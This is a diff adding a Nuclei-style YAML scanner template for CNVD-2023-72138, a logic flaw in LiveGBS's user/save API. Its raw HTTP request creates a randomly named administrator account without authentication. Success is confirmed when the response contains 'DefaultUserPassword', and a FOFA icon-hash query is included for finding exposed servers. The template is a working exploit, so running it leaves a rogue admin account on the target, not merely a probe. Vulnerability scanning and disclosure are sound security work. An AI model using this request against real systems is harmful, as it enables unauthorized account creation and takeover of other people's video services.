@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - DefaultUserPassword
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/v1/user/save?ID=&Username={{username}}&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
+          Host: {{Hostname}}
+id: LiveGBS-user_save-User-addition
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="-206100324"
+        LiveGBS user/save 接口处存在逻辑缺陷漏洞，未经身份验证的攻击者可利用该漏洞任意添加用户，导致后台服务被接管，造成信息泄露等不良影响。
+    name: LiveGBS user/save 逻辑缺陷漏洞(CNVD-2023-72138)
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140137358
+    severity: medium
+    tags:
+        - User addition
+        - LiveGBS
+variables:
+    username: '{{to_lower(rand_base(5))}}'
